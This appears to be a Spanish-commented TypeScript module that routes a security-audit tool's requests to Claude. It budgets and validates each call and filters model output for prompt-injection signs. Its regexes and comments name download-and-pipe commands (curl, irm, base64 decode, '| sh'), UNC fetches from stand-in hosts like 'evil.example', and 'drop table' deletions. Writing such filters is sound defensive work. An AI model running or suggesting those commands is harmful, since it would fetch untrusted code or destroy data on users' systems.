// Única puerta a Claude (S11 11.12 literal, S15 15.10, S05 05.4). Corre igual en el Worker y en Node 24 (dev-node.ts).
// Nadie más importa @anthropic-ai/sdk (11.1). Orden: (1) IA_CORTE=1 → disabled sin tocar la base; (2) vg_ai_status →
// nivel de la escalera; (3) vg_ai_reserve con el modelo ya elegido; (4) llamada; (5) vg_ai_settle. Nunca lanza.
// Nunca se registra el prompt, la salida del modelo ni la key: solo ids, tokens, costo y stop_reason.
import Anthropic from '@anthropic-ai/sdk';
import { z } from 'zod';
import { AuditSummary, type Coverage } from '@vanguard/contracts';
import { redact, fence, detectInjection } from '@vanguard/core';
// PROVISIONAL: ruta relativa hasta que packages/core/src/index.ts re-exporte ai.ts; entonces pasa a '@vanguard/core'.
import { peorCasoUSD, costoMensajeUSD, checkSalidaIA, type Modelo, type UsoMensaje } from '@vanguard/core';
import { log } from '../lib/log.ts';
import { NUCLEO } from './prompts/nucleo.ts';
import { SISTEMA_FIX, INSTRUCCION_FINAL as FINAL_FIX } from './prompts/fix_prompt.ts';
import { SISTEMA_RESUMEN, INSTRUCCION_FINAL as FINAL_RESUMEN } from './prompts/audit_summary.ts';
import { SISTEMA_ALERTA, INSTRUCCION_FINAL as FINAL_ALERTA } from './prompts/alert_text.ts';
import { estadoIA, reservarIA, liquidarIA } from './budget.ts';

export type RutaIA = 'fix_prompt' | 'audit_summary' | 'alert_text';
type Nivel = 'normal' | 'reduced' | 'minimal';
export type Fallo = 'disabled' | 'budget' | 'refusal' | 'timeout' | 'invalid';   // timeout = cualquier fallo transitorio del proveedor
type Plan = { model: Modelo; effort: 'low' | 'medium'; max_tokens: number; fallback: boolean; stream: boolean;
  thinking?: { type: 'between_tools' }; timeoutMs: number; retries: number };

// El plan reúne esto en prompts/index.ts; aquí, para no crear archivos fuera del encargo.
export const INSTRUCCION_FINAL: Record<RutaIA, string> = { fix_prompt: FINAL_FIX, audit_summary: FINAL_RESUMEN,
  alert_text: FINAL_ALERTA };

// ── Esquemas (S11 11.5 literal; el plan los pone en ia/esquemas.ts). El JSON Schema va a output_config.format y zod
// valida después lo que el API no admite (longitudes, tamaños de arrays). `triage` (P2) no está.
const s = { type: 'string' } as const;
const b = { type: 'boolean' } as const;
const uuid = { type: 'string', format: 'uuid' } as const;
const obj = (properties: Record<string, unknown>) =>
  ({ type: 'object', additionalProperties: false, required: Object.keys(properties), properties }) as const;

export const ESQUEMAS_JSON = {
  fix_prompt: obj({ contexto: s, pasos: { type: 'array', items: s }, prompt_para_tu_ia: s,
                    prueba_de_aceptacion: s, sospecha_inyeccion: b }),
  audit_summary: obj({ resumen: s, top: { type: 'array', items: obj({ finding_id: uuid, por_que: s }) },
                       relaciones: { type: 'array', items: obj({ finding_ids: { type: 'array', items: uuid }, explicacion: s }) },
                       sospecha_inyeccion: b }),
  alert_text: obj({ whatsapp: s, voz: s, sospecha_inyeccion: b }),
} as const;

// zod: límites que el API no puede imponer. Holgura sobre lo que pide el prompt para no tirar respuestas buenas,
// pero por debajo de los máximos del contrato de la sección 15 (FixPromptResponse.prompt ≤ 12.000; AuditSummary).
export const FixPromptIA = z.object({
  contexto: z.string().min(20).max(900), pasos: z.array(z.string().min(5).max(600)).min(2).max(7),
  prompt_para_tu_ia: z.string().min(80).max(2200), prueba_de_aceptacion: z.string().min(10).max(700),
  sospecha_inyeccion: z.boolean() });
export const AuditSummaryIA = z.object({
  resumen: z.string().min(80).max(1100),
  top: z.array(z.object({ finding_id: z.uuid(), por_que: z.string().max(400) })).min(1).max(5),
  relaciones: z.array(z.object({ finding_ids: z.array(z.uuid()).min(2).max(6), explicacion: z.string().max(500) })).max(5),
  sospecha_inyeccion: z.boolean() });
const SIN_IP_NI_ENLACE = (v: string) => !/https?:|www\.|@|\b\d{1,3}(\.\d{1,3}){3}\b/i.test(v);
export const AlertTextIA = z.object({
  whatsapp: z.string().min(20).max(300).refine(SIN_IP_NI_ENLACE, 'whatsapp con IP completa, correo o enlace'),
  voz: z.string().min(20).max(300).refine((v) => !/[0-9@]|https?:/i.test(v), 'voz con dígitos, correo o enlace'),
  sospecha_inyeccion: z.boolean() });
export type FixPromptIA = z.infer<typeof FixPromptIA>;
export type AuditSummaryIA = z.infer<typeof AuditSummaryIA>;
export type AlertTextIA = z.infer<typeof AlertTextIA>;

// ── Ruteo y escalera de degradación (11.3) ─────────────────────────────────────────────────────────────────────────
const FIX: Plan = { model: 'claude-sonnet-5-5', effort: 'medium', max_tokens: 6000, fallback: true /* decidido, 11.6 */,
  stream: false, timeoutMs: 75_000, retries: 0 };
const RESUMEN: Plan = { model: 'claude-opus-5-5', effort: 'medium', max_tokens: 16_000, fallback: true,
  stream: false /* Workers Free: un JSON.parse, no cientos de eventos SSE (11.3) */, timeoutMs: 180_000, retries: 1 };
const ALERTA: Plan = { model: 'claude-sonnet-5-5', effort: 'low', max_tokens: 800, fallback: false, stream: false,
  thinking: { type: 'between_tools' }, timeoutMs: 3_000, retries: 0 };
const RUTAS: Record<RutaIA, Record<Nivel, Plan | null>> = {
  fix_prompt:    { normal: FIX, reduced: FIX, minimal: { ...FIX, model: 'claude-haiku-5-5', fallback: false } },
  audit_summary: { normal: RESUMEN, reduced: { ...RESUMEN, model: 'claude-sonnet-5-5' },
                   minimal: { ...RESUMEN, model: 'claude-haiku-5-5', fallback: false } },   // Haiku: nunca `fallbacks`
  alert_text:    { normal: ALERTA, reduced: ALERTA, minimal: null },                         // sección 15: IA-3 apagada
};
const TOPE_PETICION_USD = 1;
const RITMO_POR_MINUTO = 10;
const TOPE_HAIKU_TOKENS = 90_000;                                            // tarifa ×5 por encima de 100K (11.2)
let cliente: Anthropic | undefined;                                          // uno por isolate

export type ResultadoIA<T> = { ok: true; data: T; model: string; cost_usd: number } | { ok: false; code: Fallo; reasons?: string[] };

export async function llamarIA<T>(env: CloudflareBindings, p: { org_id: string; ruta: RutaIA; sistema: string; datos: unknown;
  esquema: z.ZodType<T>; timeoutMs?: number; extraHosts?: string[] }): Promise<ResultadoIA<T>> {
  if (env.IA_CORTE === '1') return { ok: false, code: 'disabled' };
  if (!env.ANTHROPIC_API_KEY) return { ok: false, code: 'disabled' };        // sin key no hay IA: ni libro ni reserva
  const st = await estadoIA(env, p.org_id);
  if (!st || !st.enabled) return { ok: false, code: 'disabled' };            // sin libro no se gasta
  if (st.level === 'off' || st.calls_1m >= RITMO_POR_MINUTO) return { ok: false, code: 'budget' };
  const plan = RUTAS[p.ruta][st.level];
  if (!plan) return { ok: false, code: 'budget' };

  const system: Anthropic.TextBlockParam[] = [
    { type: 'text', text: NUCLEO, cache_control: { type: 'ephemeral' } },     // punto de caché 1 (común)
    { type: 'text', text: p.sistema, cache_control: { type: 'ephemeral' } },  // punto de caché 2 (ruta)
  ];
  const messages: Anthropic.MessageParam[] = [{ role: 'user', content: [
    { type: 'text', text: fence(p.ruta, redact(p.datos)).block },             // 06.4: {block, flags}; origen = ruta
    { type: 'text', text: INSTRUCCION_FINAL[p.ruta] },
  ] }];

  // 1) Peor caso con la cota de 11.3 (sin count_tokens: un viaje menos)
  const entrada = Math.ceil((NUCLEO.length + p.sistema.length + JSON.stringify(messages).length) / 2);
  if (plan.model === 'claude-haiku-5-5' && entrada > TOPE_HAIKU_TOKENS) return { ok: false, code: 'invalid' };
  const peor = peorCasoUSD(plan.model, entrada, plan.max_tokens, plan.fallback);
  if (peor > TOPE_PETICION_USD) return { ok: false, code: 'budget' };

  // 2) Reserva atómica en el libro (vg_ai_reserve de la sección 5)
  const rv = await reservarIA(env, p.org_id, p.ruta, plan.model, peor);
  if (!rv?.ok || !rv.usage_id) return { ok: false, code: rv?.code === 'disabled' ? 'disabled' : 'budget' };
  const reserva = rv.usage_id;

  // 3) Llamada
  let msg: Anthropic.Message;
  try {
    const ai = (cliente ??= new Anthropic({ apiKey: env.ANTHROPIC_API_KEY, maxRetries: 0 }));
    msg = await enviar(ai, plan, system, messages, p.ruta, p.timeoutMs ?? plan.timeoutMs);
  } catch (e) {
    // En el SDK de TS, APIConnectionError (y su timeout) es subclase de APIError sin `status`: cuenta como transitorio
    const status = e instanceof Anthropic.APIError && typeof e.status === 'number' ? e.status : null;
    const es4xx = status !== null && status < 500;                             // un 4xx no se cobra: costo 0
    await liquidarIA(env, reserva, { cost: es4xx ? 0 : null, stop: es4xx ? 'error_4xx' : 'error_transient' });
    log('warn', 'ia.error', { ruta: p.ruta, model: plan.model, usage_id: reserva, status,
      error_type: e instanceof Anthropic.APIError ? e.type : null, tipo: e instanceof Error ? e.name : 'desconocido' });
    return { ok: false, code: falloProveedor(e, status) };                     // devuelve, nunca lanza hacia la cola
  }

  // 4) Liquidar con el usage real (con fallback suma usage.iterations). La fila conserva plan.model (check de la sección 5)
  const u = msg.usage as UsoMensaje;
  const costo = costoMensajeUSD(msg.model, u);
  const refusal = msg.stop_reason === 'refusal' ? (msg.stop_details?.category ?? 'unknown') : null;
  await liquidarIA(env, reserva, { input: u.input_tokens, cache_read: u.cache_read_input_tokens,
    cache_write: u.cache_creation_input_tokens, output: u.output_tokens, cost: costo, stop: msg.stop_reason ?? 'unknown',
    refusal, request_id: msg.id });
  log('info', 'ia.llamada', { ruta: p.ruta, model: msg.model, usage_id: reserva, request_id: msg.id,
    stop_reason: msg.stop_reason, refusal, input_tokens: u.input_tokens ?? 0, output_tokens: u.output_tokens ?? 0,
    cache_read: u.cache_read_input_tokens ?? 0, cache_write: u.cache_creation_input_tokens ?? 0, cost_usd: costo });

  // 5) Validar: stop_reason → JSON → zod → filtro determinista
  if (msg.stop_reason === 'refusal') return { ok: false, code: 'refusal' };
  if (msg.stop_reason !== 'end_turn') return { ok: false, code: 'invalid' };               // max_tokens = JSON cortado
  const texto = msg.content.flatMap((bl) => (bl.type === 'text' ? [bl.text] : [])).join(''); // ignora thinking y bloques `fallback`
  let json: unknown;
  try { json = JSON.parse(texto); } catch { return { ok: false, code: 'invalid' }; }
  const v = p.esquema.safeParse(json);
  if (!v.success) return { ok: false, code: 'invalid' };
  // Sobre lo YA parseado: en el texto crudo un escape \uXXXX (\u007c = |) esquiva todas las banderas, y en
  // JSON.stringify cada \ sale doble y checkFixPrompt, que la lee como /, ve «//» (URL relativa al protocolo) en salidas
  // limpias como grep '\.env' o %APPDATA%\x.json. Se mira cada string tal cual y cada línea lógica que une varias líneas
  // o campos (lineasLogicas); vale la bandera de cualquiera. Con saltos de línea, otra pasada con ¶ delante de cada
  // salto solo para «borrado»: la negación («Nunca⏎Ejecuta drop table») no cruza de una línea a otra. Salto es todo
  // separador de SALTO: CR, VT, FF, NEL, LS y PS los cortaba antes, sin decirlo, el escape de JSON.stringify (\r,
  // \u000b, \f…), y un textarea o un terminal los pintan como salto. Las demás banderas no se toman de esa pasada (¶
  // pegado a un host lo vuelve inválido). Las rachas de \ pasan por barras(): «\\evil.example» (UNC o //host), también
  // entre comillas, sigue siendo un host de salida, pero no «.\\config.json» ni «[\\w.-]» de una regex. ignora_instrucciones y
  // etiqueta_rol se miran además sobre todos los campos unidos con los saltos como blancos (su .{0,40} no cruza un salto
  // y antes lo cruzaba el JSON aplanado); solo esas dos, para no unir borrados ni URLs de campos distintos.
  const hosts = p.extraHosts ?? [];
  const xs = cadenas(v.data);
  const reasons = unicos([
    ...lineasLogicas(xs).map(barras).flatMap((t) => [
      ...checkSalidaIA(t, hosts),
      ...(SALTO.test(t) ? checkSalidaIA(t.replace(SALTOS, '¶$&'), hosts).filter((f) => f === 'borrado') : [])]),
    ...checkSalidaIA(xs.join(' ').replace(SALTOS, ' '), hosts).filter((f) => f === 'ignora_instrucciones' || f === 'etiqueta_rol')]);
  if (reasons.length > 0) {
    log('warn', 'ia.salida_filtrada', { ruta: p.ruta, usage_id: reserva, reasons });     // banderas nuestras, no la salida
    return { ok: false, code: 'invalid', reasons };
  }
  return { ok: true, data: v.data, model: msg.model, cost_usd: costo };
}

/** Todos los strings de la salida validada, en orden (las claves las fija el esquema: zod descarta las demás). */
function cadenas(x: unknown): string[] {
  if (typeof x === 'string') return [x];
  return x !== null && typeof x === 'object' ? Object.values(x).flatMap(cadenas) : [];
}

// Separadores de línea: LF y CRLF (los de bash) y CR, VT, FF, NEL, LS y PS, que un textarea o un terminal también
// pintan como salto. INVISIBLES es la clase que core quita en su variante «limpia».
const SALTO = /\r\n|[\n\r\v\f\u0085\u2028\u2029]/;
const SALTOS = new RegExp(SALTO.source, 'g');
const INVISIBLES = /[\p{Cf}\p{Default_Ignorable_Code_Point}]/gu;
const RACHA = /(?<!\\)\\{2,}/g;                            // racha de 2 o más \; lineal: solo casa al inicio de la racha
const NO_ABRE = '.%~$)]}';                                 // tras ellos nunca empieza una autoridad (.\\x, %APPDATA%\\x, (x86)\\x)
const FIN_HOST = /[\s/\\]/;                                // donde acaba el servidor de una ruta UNC
// Host de fuera: una etiqueta y un punto seguido de dos letras (todo dominio de primer nivel empieza así, también xn--)
// o una IPv4 (1.2.3.4, 127.1 y 0x7f.1 también las aceptan Windows y el navegador); «\\d.5» o «(\\d.x)» de una regex en un
// literal no. El 。 y el %XX hoy no cambian nada (core no los lee como punto): están para que barras() no los esconda si
// core empieza a leerlos. Un fichero con extensión que no es dominio de primer nivel no resuelve, ni un *.localhost.
const PUNTO_HOST = /[\p{L}\p{N}\p{M}][.。][\p{L}\p{M}]{2}|^(?:0x[\da-f]*|\d+)(?:\.(?:0x[\da-f]*|\d+))+|%[0-9a-f]{2}/iu;
// FICHERO: extensión que no es dominio de primer nivel, nunca resuelve. SUELTO: extensión que sí lo es o podría serlo
// (.md, .py, .sh, .zip…): fichero solo si va suelto, sin recurso compartido detrás, dentro de un literal entre comillas
// («"\\README.md"», «"python \\manage.py"»; «net view \\evil.sh» no) y fuera de un src=/href= o un enlace Markdown, donde
// el navegador sí carga \\x.sh como //x.sh.
const FICHERO = /^[\w-]+(?:\.[\w-]+)*\.(?:jsonc?|[mc]?js|jsx|tsx?|ps[dm]?1|bat|cmd|exe|dll|ini|cfg|conf|config|ya?ml|toml|env|txt|csv|xml|html?|s?css|sql|sqlite3?|db|lock|lockb|csproj|sln|vbs?|class|jar|php|pem|crt|cer|pfx|bak|tmp|png|jpe?g|gif|svg|ico|webp|bmp|pdf|docx?|xlsx?|vue|svelte|go|rb|dart|java|kts?|swift|cs|[ch]pp|lua|tfvars|gradle|gitignore|dockerignore|npmrc|nvmrc|editorconfig|log|wasm|woff2?|ttf|otf|eot|mp[34]|wav|t?gz|tar|jsonl|proto|graphql|gql|prisma|plist|bash|zsh|ipynb|pyc|rst|tsv|patch|diff|sass|mdx)$/i;
const SUELTO = /^[\w-]+(?:\.[\w-]+)*\.(?:md|py|sh|rs|so|pl|pm|mk|mo|ml|cc|tf|ps|ai|gd|cr|in|am|zip|mov|app|key|map|less|scala|astro|properties|sum|mod|hcl|exs?|erl|elm|hs|nix|zig|sol|ejs|hbs|pug|twig|jsp|aspx?|cshtml|razor|xaml|resx)$/i;
const ENLACE = /(?:\b(?:src|href|action|formaction|data|poster|background|cite|srcset)[ \t]*=[ \t]*["']?|\]\(|<)$/i;
const NOMBRE = /^[\w.-]+$/, LOCAL = /\.localhost$/i;      // \\wsl.localhost\Ubuntu: nunca sale de la máquina
const CIERRE = new Set('`\'")]};,.:');                     // puntuación de código o de prosa tras el nombre
const LIMPIO = /[\w.-]/, LETRA = /\p{L}/u;                 // carácter de un nombre de fichero; letra
const MAS_HOST = /[.。][\p{L}\p{M}]{2}|[@%]/u;             // tras el nombre sigue un host: «x.json".evil.example», «"@evil»
// Comentario de bash tras |, |&, $(, <( o un ` que no se cierra en la línea («cmd | # instala», «cmd |#c», «sh -c "$(#c»):
// el # empieza palabra, se come el resto de la línea y lo de antes sigue abierto en la de abajo. Lineal: cada intento
// se para en el primer carácter que no es blanco tras el que abre.
const COMENTARIO = /(\|&?|\$\(|<\()[ \t]*#.*$|(`)[ \t]*#[^`]*$/;
const ABRE = /(?:\|&?|\$\(|<\(|`)$/;                       // lo que deja abierta la línea si acaba en ello
const conBarras = (t: string) => t.length >= 3 && t.startsWith('|') && t.endsWith('|');  // «| … |»
const dosCeldas = (t: string) => t.indexOf('|', 1) < t.length - 1;                       // «| a | b |», no «| sh |»
const separadora = (t: string) => conBarras(t) && t.includes('-') && /^[|:\- \t]+$/.test(t);   // «|---|», «| :-- |»
const impar = (t: string) => t.replace(/`{3,}/g, '').split('`').length % 2 === 0;        // n.º impar de ` (``` es valla)
// Comando de descarga con argumento (opción, comilla, variable, URL, host o ruta; en PowerShell también «irm (…)»,
// «irm [uri]…», «irm @p» y la continuación «irm `»), no la mención en prosa («usa curl para», «tienes curl instalado.»,
// «Instala con `curl`»). Lineal: cada intento solo recorre los blancos y la palabra que siguen.
const DESCARGA = /\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)(?:\.exe)?(?:[ \t]*[([{@]|[ \t]+(?:[-"'$\x60]|[\w.-]*(?:[:/]|\.[\w-])))|\bbase64[ \t]+(?:-d|--decode)\b/i;

/** Con \ = / (lo que hace checkFixPrompt), una racha de \\ es «//», URL relativa al protocolo. Ante un host de fuera
 *  (hostExterno) queda en exactamente \\, también tras una comilla: PowerShell y cmd no escapan la \ («& "\\evil.example\
 *  s\x.ps1"», @"\\host\x" de C#) y «"\\\\host\\x"» de un literal sigue siendo \\host. Se reduce a una \ donde no abre
 *  un host: tras . % ~ $ ) ] } (.\\config.json, %APPDATA%\\app.json, ${dir}\\x.json) o si lo que sigue no es un host de
 *  fuera («[\\w.-]+» o «(\\d.\\d)» de una regex en un literal, «"\\config.json"», «"\\.env"», src\\**\\*.json). */
function barras(t: string): string {
  return t.replace(RACHA, (m: string, i: number) => {
    const antes = t.charAt(i - 1);
    return (antes === '' || !NO_ABRE.includes(antes)) && hostExterno(t, i, m.length) ? '\\\\' : '\\';
  });
}

/** El tramo de t tras la racha de `largo` \ que empieza en `i`, hasta el blanco, / o \ (el servidor de una ruta UNC), en
 *  NFKC y sin invisibles (lo que mira core), es un host de fuera: PUNTO_HOST y no un fichero ni *.localhost. Sin recortar
 *  en ? # @ " ): Windows y el navegador no cortan ahí igual, y «\\w.)x.evil.example» sigue contando. Es fichero si su
 *  nombre limpio es FICHERO, o SUELTO (ver arriba), y tras él solo viene cierre de código sin más host («"\\run.js",
 *  "cwd"», «["python","\\manage.py"]»; «x.json".evil.example» no). Con \\ y la siguiente separación también doble, dentro
 *  de un literal y fuera de un src=/href=, son \ escapadas («"\\MyApp.Web\\appsettings.json"» es \MyApp.Web\…); el
 *  «& "\\host\\s\\x.ps1"» de PowerShell, que Windows colapsa, ya pasaba en HEAD. Lineal: los tramos de dos rachas no se
 *  pisan (cada uno acaba en la \ con la que empieza la siguiente) y ENLACE y enLiteral miran como mucho los 80
 *  caracteres anteriores. */
function hostExterno(t: string, i: number, largo: number): boolean {
  let fin = i + largo;
  while (fin < t.length && !FIN_HOST.test(t.charAt(fin))) fin++;
  const h = t.slice(i + largo, fin).normalize('NFKC').replace(INVISIBLES, '');
  if (!PUNTO_HOST.test(h)) return false;
  let e = h.length;
  while (e > 0 && CIERRE.has(h.charAt(e - 1))) e--;                      // a mano: «[…]+$» retrocede en cuadrático
  const n = h.slice(0, e);
  if (NOMBRE.test(n) && LOCAL.test(n)) return false;
  let k = 0;
  while (k < n.length && LIMPIO.test(n.charAt(k))) k++;
  const nombre = n.slice(0, k), resto = n.slice(k);
  if (resto && (!CIERRE.has(resto.charAt(0)) || MAS_HOST.test(resto))) return true;
  if (FICHERO.test(nombre)) return false;
  const sep = t.charAt(fin), doble = largo === 2 && t.startsWith('\\\\', fin);
  if (!doble && (!SUELTO.test(nombre) || sep === '\\' || sep === '/')) return true;
  const antes = t.slice(Math.max(0, i - 80), i).split(SALTOS).pop() ?? '';
  return ENLACE.test(antes) || !enLiteral(antes);
}

/** Lo que precede en la línea deja abierta una comilla (", ' o `): la \\ va dentro de un literal («"\\README.md"»,
 *  «os.system("python \\manage.py")»), no en un comando o en prosa («net view \\evil.sh»). El apóstrofo entre dos
 *  letras no cuenta («Don't run net view \\evil.sh»). */
function enLiteral(antes: string): boolean {
  let d = 0, s = 0, g = 0;
  for (let k = 0; k < antes.length; k++) {
    const c = antes.charAt(k);
    if (c === '"') d++;
    else if (c === '`') g++;
    else if (c === "'" && !(LETRA.test(antes.charAt(k - 1)) && LETRA.test(antes.charAt(k + 1)))) s++;
  }
  return d % 2 === 1 || s % 2 === 1 || g % 2 === 1;
}

/** Cada string tal cual y además cada línea lógica que une varias líneas, de un campo o de campos seguidos (se pintan en
 *  líneas seguidas). Como en bash, una línea sigue en la de abajo si acaba en \ (se quita y se pega sin espacio: «s\⏎h»
 *  es sh), en | o |& (también con el ` de PowerShell detrás, y saltando líneas vacías y comentarios) o con $(, <( o un `
 *  abierto, aunque detrás vaya un comentario (COMENTARIO: «|#c», «$( # c») o una \⏎ antes de él o de una línea vacía
 *  («|\⏎#c», «|\⏎⏎»); y una línea que empieza por | es la cola de la anterior. Una fila de tabla Markdown no es
 *  cola ni tubería salvo que la traiga una continuación de verdad: «| Usa curl |» + «Node 20» no se unen. Es fila la
 *  del bloque «| … |» con separadora («|---|»), salvo su primera fila si es de una celda y la línea lógica lleva un comando
 *  de descarga (DESCARGA: «curl …⏎| sh |⏎|---|»); sin separadora, solo «| a | b |» y solo sin comando de descarga:
 *  «curl -s https://…» + «| sh |» o + «| tee a | sh |» sí se unen. Se decide sobre NFKC sin invisibles, lo que mira
 *  core (｜ = |). Si no, no se unen: «…hace un drop» + «Table pedidos…» no es un
 *  borrado ni la negación del final de una línea tapa el comando de la siguiente. Lineal: cada línea entra a lo sumo en
 *  una unión y DESCARGA mira la línea más los 30 últimos caracteres de lo ya unido («cu\⏎rl …»). */
function lineasLogicas(xs: string[]): string[] {
  const ls = xs.flatMap((s) => s.normalize('NFKC').replace(INVISIBLES, '').split(SALTOS)).map((l) => l.trimEnd());
  const ts = ls.map((l) => l.trimStart());
  const tabla: boolean[] = [], cabecera: boolean[] = [];                  // bloque «| … |» con separadora y su 1.ª fila
  for (let i = 0, j = 0; i < ts.length; i = Math.max(j, i + 1)) {
    let sep = false;
    for (j = i; j < ts.length && conBarras(ts[j]!); j++) sep ||= separadora(ts[j]!);
    for (let k = i; k < j; k++) tabla[k] = sep;
    cabecera[i] = sep;
  }
  const fila = (k: number, descarga: boolean) => {
    const t = ts[k] ?? '';
    if (tabla[k] === true) return !descarga || cabecera[k] !== true || dosCeldas(t);
    return !descarga && conBarras(t) && dosCeldas(t);
  };
  const out = [...xs];
  // ult: lo que deja abierto lo ya unido (ABRE); fin: sus 30 últimos caracteres, aparte (un slice de la línea que crece
  // la copia entera en cada vuelta: cuadrático)
  let linea = '', fin = '', piezas = 0, descarga = false, ult = '';
  let prev: '' | 'barra' | 'tubo' | 'abre' | 'cola' = '';                  // cómo sigue la línea anterior ('' = no sigue)
  const cierra = () => { if (piezas > 1) out.push(linea); linea = fin = ult = ''; piezas = 0; descarga = false; };
  for (let i = 0; i < ls.length; i++) {
    const t = ts[i]!, real: boolean = prev === 'barra' || prev === 'tubo' || prev === 'abre';
    if ((prev === 'tubo' || prev === 'abre') && (t === '' || t.startsWith('#'))) continue;   // bash se las salta
    // Se decide sobre d: tras una \⏎, que bash quita, la línea sigue a lo ya unido, así que «cmd |\⏎#c⏎sh» y
    // «cmd |\⏎⏎sh» siguen la tubería (d = «|#c» y «|»); la pieza que se pega es lo de d que es de esta línea
    const k: number = prev === 'barra' ? ult.length : 0;
    let d: string = (k ? ult : '') + ls[i]!;
    d = d.replace(COMENTARIO, '$1$2');
    if (d.endsWith('`')) {                                                   // PowerShell: «|`⏎» sigue la tubería
      const sinBt = d.slice(0, -1).trimEnd();
      if (sinBt.endsWith('|') || sinBt.endsWith('|&')) d = sinBt;
    }
    const c = d.slice(k), sig = ts[i + 1] ?? '', pega = prev === 'barra' ? '' : ' ';
    descarga ||= DESCARGA.test(fin + (piezas ? pega : '') + c);
    prev = d.endsWith('\\') ? 'barra'
      : (d.endsWith('|') || d.endsWith('|&')) && (real || !fila(i, descarga)) ? 'tubo'
      : d.endsWith('$(') || d.endsWith('<(') || (d.endsWith('`') && impar(d)) ? 'abre'
      : sig.startsWith('|') && !fila(i + 1, descarga) ? 'cola' : '';
    const pieza = (piezas++ ? pega : '') + (prev === 'barra' ? c.slice(0, -1) : c);
    linea += pieza;
    fin = (fin + pieza).slice(-30);
    if (pieza.trim()) ult = ABRE.exec(pieza.trimEnd())?.[0] ?? '';
    if (!prev) cierra();
  }
  cierra();
  return out;
}

// Fallo del proveedor → code. Gasto o saldo de la key (400 o 403 «credit balance is too low», «usage limits» o
// «billing», 402 billing_error, 429 rate_limit_error o enforced_spend_limit_reached) → budget; otro 401/403 (key
// revocada, sin permiso o bloqueada) → disabled; otro 4xx (400, 404, 413…) → invalid; timeout, conexión, 5xx y 529 →
// timeout. Con cualquiera el llamador pone la plantilla (fix_prompt: fallback_prompt o model 'template'; resumen_ia:
// plantillaResumen) y el paso acaba en done.
const SIN_SALDO = /credit balance|usage limit|spend(?:ing)? limit|billing/i;
function falloProveedor(e: unknown, status: number | null): Fallo {
  const tipo = e instanceof Anthropic.APIError ? e.type : null;
  if (status === 402 || status === 429 || tipo === 'billing_error' || tipo === 'rate_limit_error') return 'budget';
  if ((status === 400 || status === 403) && e instanceof Error && SIN_SALDO.test(e.message)) return 'budget';
  if (status === 401 || status === 403) return 'disabled';
  return status !== null && status < 500 ? 'invalid' : 'timeout';
}

async function enviar(ai: Anthropic, plan: Plan, system: Anthropic.TextBlockParam[], messages: Anthropic.MessageParam[],
                      ruta: RutaIA, timeout: number): Promise<Anthropic.Message> {
  // Sin temperature, top_p, top_k, tool_choice ni tools (11.2, 11.11): dan 400 o abren superficie de ataque.
  const cuerpo = {
    model: plan.model, max_tokens: plan.max_tokens, system, messages,
    output_config: { effort: plan.effort, format: { type: 'json_schema' as const, schema: ESQUEMAS_JSON[ruta] } },
    ...(plan.thinking ? { thinking: plan.thinking } : {}),
  };
  const opciones = { timeout, maxRetries: plan.retries };
  if (plan.fallback) {               // fallback de servidor (11.6): solo existe en el espacio beta; forma "default" + SU beta
    // cast puntual: el esquema escrito a mano es readonly y los tipos de la beta lo piden mutable
    const bc = { ...cuerpo, betas: ['server-side-fallback-2026-07-01'], fallbacks: 'default' } as any;
    const m = plan.stream ? await ai.beta.messages.stream(bc, opciones).finalMessage() : await ai.beta.messages.create(bc, opciones);
    return m as unknown as Anthropic.Message;
  }
  const c = cuerpo as any;           // cast puntual, mismo motivo
  return plan.stream ? ai.messages.stream(c, opciones).finalMessage() : ai.messages.create(c, opciones);
}

// ── Ayudantes por ruta para el BACK ─────────────────────────────────────────────────────────────────────────────────
const unicos = (xs: string[]) => [...new Set(xs)];

export type HallazgoFix = { rule_id: string; severity: string; confirmed: boolean; title: string; resource: string;
  module: string; evidence: unknown };
export type StackFix = { provider?: string | null; framework?: string | null; package_manager?: string | null;
  repo_full_name?: string | null };
export type ResultadoFix = { ok: true; data: FixPromptIA; model: string; cost_usd: number; injection_flags: string[] }
  | { ok: false; code: Fallo; injection_flags: string[] };

/** IA-1 (E15). `data` son los cuatro campos que envuelve armarPromptCorreccion (core/templates/fix-prompt.ts); el
 *  `flavor` no entra aquí: se antepone al responder (la caché es una por hallazgo). `injection_flags` = banderas de entrada
 *  de detectInjection(evidence) + 'model_flag' si el modelo marcó sospecha + las del filtro de salida si lo tumbó. */
export async function pedirFixPrompt(env: CloudflareBindings, p: { org_id: string; hallazgo: HallazgoFix;
  stack?: StackFix | null; extraHosts?: string[]; timeoutMs?: number }): Promise<ResultadoFix> {
  const h = p.hallazgo;
  const entrada = detectInjection(h.evidence ?? {});
  const r = await llamarIA(env, { org_id: p.org_id, ruta: 'fix_prompt', sistema: SISTEMA_FIX, esquema: FixPromptIA,
    extraHosts: p.extraHosts, timeoutMs: p.timeoutMs,
    datos: { hallazgo: { rule_id: h.rule_id, severity: h.severity, confirmed: h.confirmed, title: h.title,
                         resource: h.resource, module: h.module, evidence: h.evidence ?? null },
             stack: { provider: p.stack?.provider ?? null, framework: p.stack?.framework ?? null,          // desconocidos = null
                      package_manager: p.stack?.package_manager ?? null, repo_full_name: p.stack?.repo_full_name ?? null } } });
  if (!r.ok) return { ok: false, code: r.code, injection_flags: unicos([...entrada, ...(r.reasons ?? [])]) };
  return { ok: true, data: r.data, model: r.model, cost_usd: r.cost_usd,
    injection_flags: unicos([...entrada, ...(r.data.sospecha_inyeccion ? ['model_flag'] : [])]) };
}

export const MAX_HALLAZGOS_RESUMEN = 30;                                     // S15: los 30 abiertos más graves, sin evidencia
export type HallazgoResumen = { id: string; module: string; rule_id: string; severity: string; confirmed: boolean;
  title: string; resource: string };
export type ResultadoResumen = { ok: true; summary: AuditSummary; cost_usd: number } | { ok: false; code: Fallo; reasons?: string[] };

/** IA-2 (paso resumen_ia). Devuelve el `summary` de ScanRun ya filtrado y validado con AuditSummary, o el fallo para que
 *  el BACK ponga resumenPlantilla() (con suspected_injection:true si vienen `reasons`). Sin hallazgos no llama al modelo. */
export async function pedirResumen(env: CloudflareBindings, p: { org_id: string; scan_run_id?: string; score: number | null;
  band: string | null; coverage: Coverage | null; stack?: unknown; hallazgos: HallazgoResumen[]; extraHosts?: string[];
  timeoutMs?: number }): Promise<ResultadoResumen> {
  const filas = p.hallazgos.slice(0, MAX_HALLAZGOS_RESUMEN);
  if (filas.length === 0) return { ok: false, code: 'invalid' };
  const r = await llamarIA(env, { org_id: p.org_id, ruta: 'audit_summary', sistema: SISTEMA_RESUMEN, esquema: AuditSummaryIA,
    extraHosts: p.extraHosts, timeoutMs: p.timeoutMs,
    datos: { score: p.score, band: p.band, coverage: p.coverage, stack: p.stack ?? null,
